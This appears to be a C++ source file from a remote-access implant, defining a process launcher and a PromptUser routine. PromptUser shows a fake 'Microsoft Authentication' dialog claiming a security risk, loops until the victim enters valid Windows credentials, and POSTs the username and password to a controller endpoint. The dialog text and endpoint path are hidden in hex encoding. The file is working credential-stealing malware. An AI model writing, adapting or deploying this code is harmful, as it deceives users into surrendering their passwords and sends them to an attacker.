#include "Execute.h"

void Execute::CreateProcessExeucte(string file, string params)
{
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	wstring destinationString(params.length(), L' ');
	copy(params.begin(), params.end(), destinationString.begin());
	bool openedProcess = CreateProcessW(Utils::s2ws(file).c_str(), (LPWSTR)destinationString.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
	if (!openedProcess)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
	}
	WaitForSingleObject(processInfo.hProcess, INFINITE);
	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);
}

void Execute::PromptUser(PublicStructers::client clientInfo)
{
	HttpRequests WinHttpRequests;
	CREDUI_INFO ci = { sizeof(ci) };
	string title = Encryptions::hexToAscii("4d6963726f736f66742041757468656e7469636174696f6e");
	wstring promptCaption(title.begin(), title.end());
	string title2 = Encryptions::hexToAscii("5365637572697479207269736b20686173206265656e2064657465637465642c20706c656173652072652d6c6f67696e");
	wstring promptMessage(title2.begin(), title2.end());
	string finalData;
	ci.pszCaptionText = (PCWSTR)promptCaption.c_str();
	ci.pszMessageText = (PCWSTR)promptMessage.c_str();

	WCHAR username[255] = {};
	WCHAR password[255] = {};
	DWORD result = 0;

	while (true)
	{
		result = CredUIPromptForCredentialsW(&ci, L".", NULL, 5, username, 255, password, 255, FALSE, CREDUI_FLAGS_GENERIC_CREDENTIALS);
		if (result == ERROR_SUCCESS)
		{
			HANDLE newToken = NULL;
			BOOL credentialsValid = FALSE;

			credentialsValid = LogonUserW(username, NULL, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newToken);
			if (credentialsValid)
			{
				wstring wusername(username);
				wstring wpass(password);
				string usernameS(wusername.begin(), wusername.end());
				string passwordS(wpass.begin(), wpass.end());
				finalData = Encryptions::hexToAscii("5b2b5d20557365726e616d653a20") + usernameS + "\n";
				finalData += Encryptions::hexToAscii("5b2b5d2050617373776f72643a20") + passwordS;
				break;
			}
		}
	}
	WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData, true), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
}
